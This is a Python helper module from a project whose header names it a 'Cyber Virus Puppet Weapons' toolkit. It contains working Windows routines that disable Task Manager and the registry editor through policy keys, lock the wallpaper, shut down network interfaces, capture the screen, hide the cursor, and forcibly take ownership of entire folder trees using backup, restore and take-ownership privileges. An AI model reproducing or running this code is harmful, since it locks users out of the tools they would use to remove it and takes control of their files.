# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLib/T_Tools
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# Tools
# Some of the tools in this project are complex, practical, and diverse.


from .T_imports import *
from . import T_Std


@staticmethod
def RegTaskmgrDisable() -> bool:
    try:
        key: winreg.HKEYType = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(T_Std.ErrorFormat(e, "RegTaskmgrDis Error"))
        return False
@staticmethod
def RegEditDisable() -> bool:
    try:
        key: winreg.HKEYType = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(T_Std.ErrorFormat(e, "RegEditDis Error"))
        return False
@staticmethod
def RegBgDisable() -> bool:
    try:
        key: winreg.HKEYType = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "Wallpaper", 0, winreg.REG_SZ, r"c:\\" )
        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(T_Std.ErrorFormat(e, "RegBgDis Error"))
        return False

@staticmethod
def RegTaskmgrEnable() -> bool:
    try:
        key: winreg.HKEYType = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(T_Std.ErrorFormat(e, "RegTaskmgrEnable Error"))
        return False
@staticmethod
def RegEditEnable() -> bool:
    try:
        key: winreg.HKEYType = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(T_Std.ErrorFormat(e, "RegEditEnable Error"))
        return False
@staticmethod
def RegBgEnable() -> bool:
    try:
        key: winreg.HKEYType = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.DeleteValue(key, "Wallpaper")
        winreg.DeleteValue(key, "WallpaperStyle")
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(T_Std.ErrorFormat(e, "RegBgEnable Error"))
        return False

@staticmethod
def IsProcess(name: str) -> bool:
    name: str = os.path.basename(name)
    for p in psutil.process_iter(['name']):
        if p.info['name'].lower() == name.lower():
            return True
    return False

@staticmethod
def IsService(name: str) -> bool | str:
    try: _: str = psutil.win_service_get(name)
    except: return False
    return _

@staticmethod
def GetServiceBinpath(ServiceName: str) -> str | None:
    try:
        r: subprocess.CompletedProcess = subprocess.run(["sc", "qc", ServiceName], capture_output = True, text = True, check = True)
        for line in r.stdout.splitlines():
            if "BINARY_PATH_NAME" in line:
                return line.split(":", 1)[1].strip()
        return None
    except subprocess.CalledProcessError:
        return None

#class Command:
#    def __init__(self, cmd):
#        self.cmd = cmd
#        #startupinfo = None
#        #if sys.platform.startswith('win'):
#        startupinfo = subprocess.STARTUPINFO()
#        startupinfo.dwFlags = subprocess.STARTF_USESHOWWINDOW
#        startupinfo.wShowWindow = subprocess.SW_HIDE
#        #else:
#        #    creationflags = 0
#        self.result = subprocess.run(
#            cmd,
#            stdout=subprocess.PIPE,
#            stderr = subprocess.PIPE,
#            universal_newlines=True,
#            shell=False,
#            startupinfo=startupinfo,
#            creationflags=subprocess.CREATE_NO_WINDOW
#        )
#        self.stdout = self.result.stdout
#        self.stderr = self.result.stderr
#        self.returncode = self.result.returncode
#    def __str__(self):
#        return self.stdout
#    def count(self, substring):
#        return self.stdout.count(substring) + self.stderr.count(substring)
#    def ishad(self, items):
#        if not isinstance(items, (list, tuple, set)): items = [items]
#        return any(self.count(item) > 0 for item in items)
#    def successtatus(self):
#        return self.ishad(["success", "successfully", "成功"])

class Command:
    def __init__(self, cmd: str):
        self.cmd: dict = cmd if type(cmd) == list else shlex.split(cmd)
        self.CompletedProcess: subprocess.CompletedProcess = subprocess.run(self.cmd, capture_output=True, text=True, shell=False)
        self.result: str = self.CompletedProcess.stdout
        self.returncode: str = self.CompletedProcess.returncode
    def __str__(self) -> str:
        return self.result
    def count(self, substring: str) -> int:
        return self.result.count(substring)
    def ishad(self, items: str | list | tuple | set) -> bool:
        if not isinstance(items, (list, tuple, set)): items: dict = [items]
        return any(self.count(item) > 0 for item in items)
    def successtatus(self) -> bool:
        return self.ishad(["success", "successfully", "成功"])

class WindowsService:
    @staticmethod
    def StartService(ServiceName: str) -> bool:
        try:
            win32serviceutil.StartService(ServiceName)
            return True
        except pywintypes.error as e:
            return e.winerror
    @staticmethod
    def StopService(ServiceName: str) -> bool:
        try:
            win32serviceutil.StopService(ServiceName)
            return True
        except pywintypes.error as e:
            return e.winerror


def DisableNetwork() -> list[str] | None:
    system: str = platform.system()
    if system == "Linux":
        result: subprocess.CompletedProcess = subprocess.run(['ip', '-o', 'link', 'show'], capture_output=True, text=True)
        interfaces: list[str] = [line.split(':')[1].strip() for line in result.stdout.split('\n') if 'state UP' in line]
        if interfaces:
            for interface in interfaces:
                subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'])
            return interfaces
    elif system == "Windows":
        result: subprocess.CompletedProcess = subprocess.run(['netsh', 'interface', 'show', 'interface'], capture_output=True, text=True)
        connections: list[str] = [line.split('  ')[-1].strip() for line in result.stdout.split('\n') if 'Connected' in line and not 'Loopback' in line]
        if connections:
            for conn in connections:
                subprocess.run(['netsh', 'interface', 'set', 'interface', f'name="{conn}"', 'admin=disable'])
            return connections
    return None
def EnableNetwork(interfaces: list[str]) -> None:
    system: str = platform.system()
    if system == "Linux" and interfaces:
        for interface in interfaces:
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])
    elif system == "Windows" and interfaces:
        for conn in interfaces:
            subprocess.run(['netsh', 'interface', 'set', 'interface', f'name="{conn}"', 'admin=enable'])



class WindowsScreenCapture:
    def __init__(self):
        self.user32: ctypes.WinDLL = ctypes.windll.user32
        self.gdi32: ctypes.WinDLL = ctypes.windll.gdi32
        class CURSORINFO(ctypes.Structure):
            _fields_: list[tuple[str, ctypes.c_uint]] = [
                ("cbSize", ctypes.c_uint),
                ("flags", ctypes.c_uint),
                ("hCursor", ctypes.c_void_p),
                ("ptScreenPos", ctypes.wintypes.POINT)
            ]
        class ICONINFO(ctypes.Structure):
            _fields_: list[tuple[str, ctypes.c_uint]] = [
                ("fIcon", ctypes.c_bool),
                ("xHotspot", ctypes.c_uint),
                ("yHotspot", ctypes.c_uint),
                ("hbmMask", ctypes.c_void_p),
                ("hbmColor", ctypes.c_void_p)
            ]
        self.CURSORINFO: type[CURSORINFO] = CURSORINFO
        self.ICONINFO: type[ICONINFO] = ICONINFO
    @property
    def X(self) -> int:
        return win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
    @property
    def Y(self) -> int:
        return win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
    def GetCursorPosition(self) -> tuple[int, int]:
        CursorInfo = self.CURSORINFO()
        CursorInfo.cbSize = ctypes.sizeof(CursorInfo)
        self.user32.GetCursorInfo(ctypes.byref(CursorInfo))
        return CursorInfo.ptScreenPos.x, CursorInfo.ptScreenPos.y
    def GetCursorImage(self) -> tuple[Image.Image, tuple[int, int]]:
        CursorInfo = self.CURSORINFO()
        CursorInfo.cbSize = ctypes.sizeof(CursorInfo)
        self.user32.GetCursorInfo(ctypes.byref(CursorInfo))
        if CursorInfo.flags != 1:
            return None, (0, 0)
        IconInfo = self.ICONINFO()
        self.user32.GetIconInfo(CursorInfo.hCursor, ctypes.byref(IconInfo))
        CursorWidth: int = self.user32.GetSystemMetrics(0)
        CursorHeight: int = self.user32.GetSystemMetrics(1)
        CursorBmp: Image.Image = Image.new("RGBA", (CursorWidth, CursorHeight), (0, 0, 0, 0))
        return CursorBmp, (IconInfo.xHotspot, IconInfo.yHotspot)
    def CaptureScreenWithCursor(self) -> Image.Image:
        ScreenShot: Image.Image = ImageGrab.grab()
        CursorPos: tuple[int, int] = self.GetCursorPosition()
        CursorImage: Image.Image
        Hotspot: tuple[int, int]
        CursorImage, Hotspot = self.GetCursorImage()
        if CursorImage:
            DrawX: int = CursorPos[0] - Hotspot[0]
            DrawY: int = CursorPos[1] - Hotspot[1]
            ScreenShot.paste(CursorImage, (DrawX, DrawY), CursorImage)
        return ScreenShot
    def CompressImageWithLevel(self, image: Image.Image, CompressionLevel: int = 10) -> tuple[bytes, str]:
        CompressionLevel: int = max(0, min(20, CompressionLevel))
        if CompressionLevel == 0:
            Buffer: io.BytesIO = io.BytesIO()
            image.save(Buffer, format = "PNG")
            return Buffer.getvalue(), "png"
        Quality: int = 95 - (CompressionLevel * 4.5)
        SizeFactor: float = 1.0 - ((CompressionLevel - 1) * 0.045)
        if CompressionLevel > 1:
            Width: int
            Height: int
            Width, Height = image.size
            NewWidth: int
            NewHeight: int
            NewWidth, NewHeight = int(Width * SizeFactor), int(Height * SizeFactor)
            image: Image.Image = image.resize((NewWidth, NewHeight), Image.Resampling.LANCZOS)
        image: Image.Image = image.convert("RGB")
        Buffer: io.BytesIO = io.BytesIO()
        image.save(Buffer, format = "JPEG", quality = int(Quality), optimize = True)
        Buffer.seek(0)
        return Buffer.read(), "jpg"
    def CaptureAndCompressScreenshot(self, CompressionLevel: int = 10, LeftX: int = None, LeftY: int = None, RightX: int = None, RightY: int = None) -> dict | None:
        try:
            StartTime: float = time.time()
            if None in (LeftX, LeftY, RightX, RightY): bbox = None
            else: bbox: tuple[int, int, int, int] = (LeftX, LeftY, RightX, RightY)
            ScreenShotEvent: threading.Event = threading.Event()
            CursorEvent: threading.Event = threading.Event()
            ScreenShotResult: list[Image.Image] = []
            CursorResult: list[tuple[int, int], Image.Image, tuple[Image.Image | None, tuple[int, int]]] = []
            def CaptureScreenShot():
                try:
                    ScreenShotResult.append(ImageGrab.grab(bbox = bbox) if bbox else ImageGrab.grab())
                    ScreenShotEvent.set()
                except: return False
            def CaptureCursor():
                try:
                    CursorImage: Image.Image
                    Hotspot: tuple[Image.Image, tuple[int, int]]
                    CursorImage, Hotspot = self.GetCursorImage()
                    CursorResult.extend([self.GetCursorPosition(), CursorImage, Hotspot])
                    CursorEvent.set()
                except: return False
            t1 = threading.Thread(target = CaptureScreenShot)
            t2 = threading.Thread(target = CaptureCursor)
            t1.start()
            t2.start()
            t1.join()
            t2.join()
            ScreenShot: Image.Image = ScreenShotResult[0]
            CursorPos: tuple[int, int]
            CursorImage: Image.Image
            Hotspot: tuple[Image.Image, tuple[int, int]]
            CursorPos, CursorImage, Hotspot = CursorResult
            if CursorImage:
                DrawX: int = CursorPos[0] - Hotspot[0]
                DrawY: int = CursorPos[1] - Hotspot[1]
                if bbox:
                    if (bbox[0] <= DrawX <= bbox[2] and 
                        bbox[1] <= DrawY <= bbox[3]):
                        ScreenShot.paste(CursorImage, (DrawX - bbox[0], DrawY - bbox[1]), CursorImage)
                else: ScreenShot.paste(CursorImage, (DrawX, DrawY), CursorImage)
            ImageData: bytes | Image.Image
            Format: typing.Literal["jpg", "png", "gif"]
            ImageData, Format = self.CompressImageWithLevel(ScreenShot, CompressionLevel)
            return {
                'ImageBytes': ImageData,
                'Format': Format,
                'CompressionLevel': CompressionLevel,
                'TimeElapsed': time.time() - StartTime,
                'FileSize': len(ImageData),
                'IsRegion': bbox is not None,
                'Region': bbox if bbox else None
            }
        except Exception as e:
            return None
    def AdjustCoordinatesAdvanced(self, CurrentCoords: tuple[int, int], MinCoord, MaxCoord, DeltaX: int = 25, DeltaY: int = 25):
        X: int
        Y: int
        MinX: int
        MinY: int
        MaxX: int
        MaxY: int
        X, Y = CurrentCoords
        MinX, MinY = MinCoord
        MaxX, MaxY = MaxCoord
        return (max(X - DeltaX, MinX), max(Y - DeltaY, MinY)), (min(X + DeltaX, MaxX), min(Y + DeltaY, MaxY))

def ReadFileRangeFromEnd(FilePath: str, StartLineFromEnd: int, EndLineFromEnd: int, BufferSize: int = 1024 * 10, ReturnType: typing.Union[str, list] = str) -> str | list | bytes | ValueError:
    if StartLineFromEnd < 1 or EndLineFromEnd < 1: raise ValueError("Line number must be greater than 0")
    if StartLineFromEnd > EndLineFromEnd: raise ValueError("StartLineFromEnd must be less than or equal to EndLineFromEnd")
    LineCount: int = EndLineFromEnd
    BufferSize: int = BufferSize * LineCount
    with open(FilePath, 'rb') as FileObj:
        FileObj.seek(0, 2)
        FileSize: int = FileObj.tell()
        BufferSize: int = min(BufferSize, FileSize)
        Lines: list = []
        CurrentPosition: int = FileSize
        FoundLines: int = 0
        while CurrentPosition > 0 and FoundLines < LineCount:
            ReadPosition: int = max(0, CurrentPosition - BufferSize)
            ChunkSize: int = CurrentPosition - ReadPosition
            FileObj.seek(ReadPosition)
            Chunk: bytes = FileObj.read(ChunkSize)
            ChunkLines: list[bytes | str] = Chunk.splitlines()
            ChunkLines: bytes | str = ChunkLines[::-1]
            for Line in ChunkLines:
                if FoundLines < LineCount:
                    Lines.append(Line)
                    FoundLines += 1
                else: break
            CurrentPosition: int = ReadPosition
        Lines: bytes | str = Lines[::-1]
        StartIndex: int = max(0, len(Lines) - EndLineFromEnd)
        EndIndex: int = len(Lines) - StartLineFromEnd + 1
        ResultLines: bytes | str = Lines[StartIndex:EndIndex]
        Result: list[str] = [Line.decode('utf-8', errors='ignore') for Line in ResultLines]
        if ReturnType == str: return '\n'.join(Result)
        elif ReturnType == list: return Result
        else: raise ValueError("Return Type Error")

def GetFileSha256(FilePath: str, ChunkSize: int = 4096) -> str:
    Sha256Hash: hashlib._Hash = hashlib.sha256()
    with open(FilePath, 'rb') as f:
        while True:
            Chunk: bytes = f.read(ChunkSize)
            if not Chunk: break
            Sha256Hash.update(Chunk)
    return Sha256Hash.hexdigest()

def GetBytesSha256(Data: bytes, ChunkSize: int = 4096) -> str:
    Sha256Hash: hashlib._Hash = hashlib.sha256()
    for i in range(0, len(Data), ChunkSize):
        Sha256Hash.update(Data[i:i+ChunkSize])
    return Sha256Hash.hexdigest()

def IsSha256(s: str):
    return bool(re.fullmatch(r'[a-fA-F0-9]{64}', s))

class FileSystemPermissionEnforcer:
    @staticmethod
    def _setFilePermissionsWithTakeOwnership(hFile: str, sid = None) -> bool | None:
        try:
            if sid is None: sid = win32security.LookupAccountName("", win32api.GetUserName())[0]
            secDesc = win32security.GetFileSecurity(hFile, win32security.OWNER_SECURITY_INFORMATION)
            secDesc.SetSecurityDescriptorOwner(sid, False)
            dacl = win32security.ACL()
            dacl.AddAccessAllowedAce(
                win32security.ACL_REVISION,
                ntsecuritycon.GENERIC_ALL,
                sid
            )
            secDesc.SetSecurityDescriptorDacl(1, dacl, 0)
            win32security.SetFileSecurity(hFile, win32security.DACL_SECURITY_INFORMATION, secDesc)
            return True
        except Exception: return False
    @staticmethod
    def _setFilePermissionsWithBackupRestore(hFile: str) -> bool | None:
        try:
            token = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
            )
            win32security.AdjustTokenPrivileges(
                token,
                False,
                [
                    (win32security.LookupPrivilegeValue(None, win32security.SE_BACKUP_NAME), win32security.SE_PRIVILEGE_ENABLED),
                    (win32security.LookupPrivilegeValue(None, win32security.SE_RESTORE_NAME), win32security.SE_PRIVILEGE_ENABLED),
                ]
            )
            sid = win32security.LookupAccountName("", win32api.GetUserName())[0]
            secDesc = win32security.SECURITY_DESCRIPTOR()
            dacl = win32security.ACL()
            dacl.AddAccessAllowedAce(
                win32security.ACL_REVISION,
                ntsecuritycon.GENERIC_ALL,
                sid
            )
            secDesc.SetSecurityDescriptorDacl(1, dacl, 0)
            secDesc.SetSecurityDescriptorOwner(sid, False)
            win32security.SetFileSecurity(hFile, win32security.DACL_SECURITY_INFORMATION | win32security.OWNER_SECURITY_INFORMATION, secDesc)
            return True
        except Exception: return False
    @staticmethod
    def _setFilePermissionsWithTakeOwnershipPrivilege(hFile: str) -> bool | None:
        try:
            token = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
            )
            win32security.AdjustTokenPrivileges(
                token,
                False,
                [
                    (win32security.LookupPrivilegeValue(None, win32security.SE_TAKE_OWNERSHIP_NAME), win32security.SE_PRIVILEGE_ENABLED),
                ]
            )
            return FileSystemPermissionEnforcer._setFilePermissionsWithTakeOwnership(hFile)
        except Exception: return False
    @staticmethod
    def _setFilePermissionsWithAdminPrivilege(hFile: str) -> bool | None:
        try:
            adminSid = win32security.LookupAccountName("", "Administrators")[0]
            secDesc = win32security.GetFileSecurity(hFile, win32security.DACL_SECURITY_INFORMATION)
            dacl = win32security.ACL()
            dacl.AddAccessAllowedAce(
                win32security.ACL_REVISION,
                ntsecuritycon.GENERIC_ALL,
                adminSid
            )
            secDesc.SetSecurityDescriptorDacl(1, dacl, 0)
            win32security.SetFileSecurity(hFile, win32security.DACL_SECURITY_INFORMATION, secDesc)
            return True
        except Exception: return False
    @staticmethod
    def _setFilePermissionsWithForceMode(hFile: str) -> bool | None:
        try:
            sid = win32security.LookupAccountName("", win32api.GetUserName())[0]
            secDesc = win32security.SECURITY_DESCRIPTOR()
            dacl = win32security.ACL()
            dacl.AddAccessAllowedAce(
                win32security.ACL_REVISION,
                ntsecuritycon.GENERIC_ALL,
                sid
            )
            secDesc.SetSecurityDescriptorDacl(1, dacl, 0)
            secDesc.SetSecurityDescriptorOwner(sid, False)
            win32security.SetFileSecurity(
                hFile,
                win32security.DACL_SECURITY_INFORMATION | 
                win32security.OWNER_SECURITY_INFORMATION | 
                win32security.GROUP_SECURITY_INFORMATION,
                secDesc
            )
            return True
        except Exception: return False
    @staticmethod
    def _setFilePermissionsWithInheritance(hFile: str) -> bool | None:
        try:
            sid = win32security.LookupAccountName("", win32api.GetUserName())[0]
            secDesc = win32security.SECURITY_DESCRIPTOR()
            dacl = win32security.ACL()
            dacl.AddAccessAllowedAce(
                win32security.ACL_REVISION,
                ntsecuritycon.GENERIC_ALL,
                sid
            )
            secDesc.SetSecurityDescriptorDacl(1, dacl, 0)
            secDesc.SetSecurityDescriptorOwner(sid, False)
            win32security.SetFileSecurity(
                hFile,
                win32security.DACL_SECURITY_INFORMATION | 
                win32security.OWNER_SECURITY_INFORMATION | 
                win32security.PROTECTED_DACL_SECURITY_INFORMATION,
                secDesc
            )
            return True
        except Exception: return False
    @staticmethod
    def _tryAllPermissionMethods(filePath: str) -> bool | None:
        methods: typing.List[typing.Callable] = [
            FileSystemPermissionEnforcer._setFilePermissionsWithTakeOwnership,
            FileSystemPermissionEnforcer._setFilePermissionsWithBackupRestore,
            FileSystemPermissionEnforcer._setFilePermissionsWithTakeOwnershipPrivilege,
            FileSystemPermissionEnforcer._setFilePermissionsWithAdminPrivilege,
            FileSystemPermissionEnforcer._setFilePermissionsWithForceMode,
            FileSystemPermissionEnforcer._setFilePermissionsWithInheritance,
        ]
        try:
            hFile: str = win32file.CreateFile(
                filePath,
                win32con.GENERIC_READ | win32con.GENERIC_WRITE,
                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
                None,
                win32con.OPEN_EXISTING,
                win32con.FILE_FLAG_BACKUP_SEMANTICS,
                None
            )
            for method in methods:
                try: return method(hFile)
                except Exception: continue
            return False
        finally:
            try:
                if 'hFile' in locals(): win32file.CloseHandle(hFile)
            except: pass
    @staticmethod
    def enforcePermissionsRecursive(folderPath: str) -> bool | None:
        try:
            if not FileSystemPermissionEnforcer._tryAllPermissionMethods(folderPath): return False
            for root, dirs, files in os.walk(folderPath):
                for dirName in dirs:
                    if not FileSystemPermissionEnforcer._tryAllPermissionMethods(os.path.join(root, dirName)): return False
                for fileName in files:
                    if not FileSystemPermissionEnforcer._tryAllPermissionMethods(os.path.join(root, fileName)): return False
            return True
        except Exception:
            return False

def GetPidsPath(Path: str) -> list:
    pids: list[int] = []
    for proc in psutil.process_iter(['pid', 'exe']):
        try:
            if proc.info['exe'] and proc.info['exe'].lower() == Path.lower():
                pids.append(proc.info['pid'])
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess): pass
    return pids

def GetDiskUuidByDriveLetter(wmi_conn, DL: str):
    try:
        disks = wmi_conn.Win32_LogicalDisk(DeviceID = f"{DL.upper()}:")
        if disks: return disks[0].VolumeSerialNumber
        else: return None
    except Exception as e:
        return None

def InstallFont(FontPath):
    ctypes.windll.gdi32.AddFontResourceExW(FontPath, 0x10, 0)

def HideCursor():
    while ctypes.windll.user32.ShowCursor(False) >= 0: pass

def ShowCursor():
    while ctypes.windll.user32.ShowCursor(True) < 0: pass

def CombineBytesPrefixed(Parts: list[bytes]) -> bytes:
    Combined = b""
    for Part in Parts:
        PartLen = len(Part)
        LenPrefix = struct.pack("I", PartLen)
        Combined += LenPrefix + Part
    return Combined
def SplitBytesPrefixed(Combined: bytes) -> list[bytes]:
    Parts = []
    offset = 0
    Combined_len = len(Combined)
    while offset < Combined_len:
        if offset + 4 > Combined_len:
            raise ValueError("Combined bytes format is invalid, missing length prefix")
        LenPrefix = Combined[offset:offset+4]
        PartLen = struct.unpack("I", LenPrefix)[0]
        if offset + 4 + PartLen > Combined_len:
            raise ValueError("Combined bytes format is invalid, missing part content")
        Part = Combined[offset+4 : offset+4+PartLen]
        Parts.append(Part)
        offset += 4 + PartLen
    return Parts

class ChildProcessManager:
    def __init__(self):
        self.HJob = None
        self.ProcessId = None
        self.ProcessHandle = None
        self.logger = None

    def SetLogger(self, logger):
        self.logger = logger
    def Info(self, *args):
        if not self.logger: return print(*args)
        self.logger.Info(" ".join(args))

    def StartChildProcess(self, ExePath):
        self._Cleanup()
        try:
            self.HJob = win32job.CreateJobObject(None, "")
            if not self.HJob: raise Exception("Failed To Create Job Object")
        except Exception as e:
            self.Info(f"Failed To Create Job Object: {e}")
            self._Cleanup()
            return False
        try:
            info = win32job.QueryInformationJobObject(self.HJob, win32job.JobObjectExtendedLimitInformation)
            info['BasicLimitInformation']['LimitFlags'] |= win32job.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
            win32job.SetInformationJobObject(self.HJob, win32job.JobObjectExtendedLimitInformation, info)
        except Exception as e:
            self.Info(f"Failed To Set Job Object Information: {e}")
            self._Cleanup()
            return False

        startUpInfo = win32process.STARTUPINFO()
        try:
            hProcess, hThread, dwProcessId, dwThreadId = win32process.CreateProcess(
                None, ExePath, None, None, False,
                win32process.CREATE_NEW_PROCESS_GROUP | win32process.CREATE_SUSPENDED,
                None, None, startUpInfo
            )
            self.ProcessId = dwProcessId
            self.ProcessHandle = hProcess
            win32job.AssignProcessToJobObject(self.HJob, hProcess)
            win32process.ResumeThread(hThread)
            win32api.CloseHandle(hThread)
            self.Info(f"Successfully Started Child Process, PID: {dwProcessId}")
            return True
        except Exception as e:
            self.Info(f"Failed To Start Child Process: {e}")
            self._Cleanup()
            return False
    def IsProcessAlive(self):
        if not self.ProcessId or not self.ProcessHandle: return False
        try:
            result = win32event.WaitForSingleObject(self.ProcessHandle, 0)
            return result == win32con.WAIT_TIMEOUT
        except Exception as e:
            self.Info(f"Failed To Check Process Status: {e}")
            return False
    def _Cleanup(self):
        if self.ProcessHandle:
            try: win32api.CloseHandle(self.ProcessHandle)
            except: pass
            self.ProcessHandle = None
        if self.HJob:
            try: win32api.CloseHandle(self.HJob)
            except: pass
            self.HJob = None
        self.ProcessId = None
    def Close(self):
        self._Cleanup()